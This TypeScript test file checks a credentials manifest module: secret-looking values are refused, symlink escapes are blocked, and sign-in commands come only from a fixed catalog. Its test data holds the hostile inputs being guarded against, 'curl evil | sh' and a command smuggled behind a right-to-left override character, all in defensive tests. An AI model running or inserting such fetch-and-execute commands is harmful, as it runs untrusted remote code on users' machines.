// @effect-diagnostics nodeBuiltinImport:off - temp project folders and links.
import * as NodeFSP from "node:fs/promises";
import * as NodeOS from "node:os";
import * as NodePath from "node:path";

import { PROJECT_CREDENTIALS_MANIFEST_PATH } from "@specweave-studio/contracts";
import { afterEach, beforeEach, describe, expect, it } from "vite-plus/test";

import { CREDENTIAL_CATALOG, signInCommand } from "./catalog.ts";
import { ManifestRefusal, readManifest, writeManifest } from "./manifest.ts";

let base: string;
let root: string;
const manifestPath = () => NodePath.join(root, PROJECT_CREDENTIALS_MANIFEST_PATH);

beforeEach(async () => {
  base = await NodeFSP.realpath(
    await NodeFSP.mkdtemp(NodePath.join(NodeOS.tmpdir(), "credentials-manifest-")),
  );
  root = NodePath.join(base, "project");
  await NodeFSP.mkdir(root);
});
afterEach(async () => {
  await NodeFSP.rm(base, { recursive: true, force: true });
});

const put = async (text: string) => {
  await NodeFSP.mkdir(NodePath.dirname(manifestPath()), { recursive: true });
  await NodeFSP.writeFile(manifestPath(), text);
};

describe("readManifest", () => {
  it("answers null when the project has no manifest", async () => {
    expect(await readManifest(root)).toBeNull();
    await NodeFSP.mkdir(NodePath.join(root, ".specweave"));
    expect(await readManifest(root)).toBeNull();
  });

  it("reads a saved manifest", async () => {
    await put(JSON.stringify({ version: 1, credentials: [{ id: "github", skip: true }] }));
    expect(await readManifest(root)).toEqual({
      ok: true,
      manifest: { version: 1, credentials: [{ id: "github", skip: true }] },
    });
  });

  it("refuses a manifest that carries a value, naming the field only", async () => {
    const secret = `${"gh"}p_${"z".repeat(36)}`;
    await put(JSON.stringify({ version: 1, credentials: [{ id: "github", note: secret }] }));
    const result = await readManifest(root);
    expect(result).toMatchObject({ ok: false });
    expect(JSON.stringify(result)).not.toContain(secret);
    expect(JSON.stringify(result)).toContain("Entry 1: note");
  });

  it("refuses a manifest that tries to name a command", async () => {
    await put(
      JSON.stringify({ version: 1, credentials: [{ id: "github", signIn: "curl evil | sh" }] }),
    );
    expect(await readManifest(root)).toMatchObject({ ok: false });
  });

  it("refuses broken JSON, a large file and a linked file", async () => {
    await put("{ not json");
    expect(await readManifest(root)).toMatchObject({ ok: false, problem: /not valid JSON/u });
    await put(" ".repeat(70 * 1024));
    expect(await readManifest(root)).toMatchObject({ ok: false, problem: /too large/u });
    const outside = NodePath.join(base, "outside.json");
    await NodeFSP.writeFile(outside, JSON.stringify({ version: 1, credentials: [] }));
    await NodeFSP.rm(manifestPath());
    await NodeFSP.symlink(outside, manifestPath());
    expect(await readManifest(root)).toMatchObject({ ok: false, problem: /a link/u });
    // A link to nothing is still a link, not a missing list.
    await NodeFSP.rm(manifestPath());
    await NodeFSP.symlink(NodePath.join(base, "absent.json"), manifestPath());
    expect(await readManifest(root)).toMatchObject({ ok: false, problem: /a link/u });
  });

  it("refuses a linked .specweave folder", async () => {
    const elsewhere = NodePath.join(base, "elsewhere");
    await NodeFSP.mkdir(NodePath.join(elsewhere, "project"), { recursive: true });
    await NodeFSP.writeFile(
      NodePath.join(elsewhere, "project", "credentials.json"),
      JSON.stringify({ version: 1, credentials: [{ id: "aws" }] }),
    );
    await NodeFSP.symlink(elsewhere, NodePath.join(root, ".specweave"));
    expect(await readManifest(root)).toMatchObject({ ok: false, problem: /link or a file/u });
  });
});

describe("writeManifest", () => {
  it("creates the folders and saves a file readManifest accepts", async () => {
    const path = await writeManifest(root, {
      version: 1,
      credentials: [{ id: "azure" }, { id: "npm", skip: true, note: "publishing only" }],
    });
    expect(path).toBe(PROJECT_CREDENTIALS_MANIFEST_PATH);
    expect(await readManifest(root)).toEqual({
      ok: true,
      manifest: {
        version: 1,
        credentials: [{ id: "azure" }, { id: "npm", skip: true, note: "publishing only" }],
      },
    });
    const names = await NodeFSP.readdir(NodePath.dirname(manifestPath()));
    expect(names).toEqual(["credentials.json"]);
  });

  it("replaces an earlier manifest", async () => {
    await writeManifest(root, { version: 1, credentials: [{ id: "azure" }] });
    await writeManifest(root, { version: 1, credentials: [{ id: "github" }] });
    expect(await readManifest(root)).toMatchObject({
      manifest: { credentials: [{ id: "github" }] },
    });
  });

  it("never writes through a linked folder out of the project", async () => {
    const outside = NodePath.join(base, "outside");
    await NodeFSP.mkdir(outside);
    await NodeFSP.symlink(outside, NodePath.join(root, ".specweave"));
    await expect(
      writeManifest(root, { version: 1, credentials: [{ id: "github" }] }),
    ).rejects.toBeInstanceOf(ManifestRefusal);
    expect(await NodeFSP.readdir(outside)).toEqual([]);
  });

  it("never writes through a linked project folder inside .specweave", async () => {
    const outside = NodePath.join(base, "outside");
    await NodeFSP.mkdir(outside);
    await NodeFSP.mkdir(NodePath.join(root, ".specweave"));
    await NodeFSP.symlink(outside, NodePath.join(root, ".specweave", "project"));
    await expect(
      writeManifest(root, { version: 1, credentials: [{ id: "github" }] }),
    ).rejects.toBeInstanceOf(ManifestRefusal);
    expect(await NodeFSP.readdir(outside)).toEqual([]);
  });

  it("refuses when credentials.json is a link, leaving its target alone", async () => {
    const target = NodePath.join(base, "tracked.txt");
    await NodeFSP.writeFile(target, "keep me");
    await NodeFSP.mkdir(NodePath.dirname(manifestPath()), { recursive: true });
    await NodeFSP.symlink(target, manifestPath());
    await expect(
      writeManifest(root, { version: 1, credentials: [{ id: "github" }] }),
    ).rejects.toBeInstanceOf(ManifestRefusal);
    expect(await NodeFSP.readFile(target, "utf8")).toBe("keep me");
  });

  it("refuses a value before touching the disk", async () => {
    await expect(
      writeManifest(root, {
        version: 1,
        credentials: [{ id: "github", note: `${"s"}k-${"q".repeat(40)}` }],
      }),
    ).rejects.toBeInstanceOf(ManifestRefusal);
    expect(await NodeFSP.readdir(root)).toEqual([]);
  });
});

describe("catalog", () => {
  it("is the only source of a sign-in command, whatever a manifest says", async () => {
    // A hostile note is refused outright, so nothing of it can sit beside a command.
    await put(
      JSON.stringify({
        version: 1,
        credentials: [{ id: "github", note: "ok\u202E && curl evil | sh" }],
      }),
    );
    expect(await readManifest(root)).toMatchObject({ ok: false });
    const github = CREDENTIAL_CATALOG.find((entry) => entry.id === "github")!;
    expect(signInCommand(github, "darwin")).toBe("gh auth login && gh auth setup-git");
  });

  it("has one entry per id, each with a command, and no probe that reads project config", () => {
    const ids = CREDENTIAL_CATALOG.map((entry) => entry.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const entry of CREDENTIAL_CATALOG) {
      expect(signInCommand(entry, "linux").length).toBeGreaterThan(0);
      expect(signInCommand(entry, "win32").length).toBeGreaterThan(0);
    }
    const probed = CREDENTIAL_CATALOG.filter((entry) => entry.probe !== null).map(
      (entry) => entry.probe!.binary,
    );
    expect(probed).not.toContain("npm");
    expect(probed).not.toContain("wrangler");
    expect(probed).not.toContain("docker");
    expect(probed).not.toContain("security");
  });
});
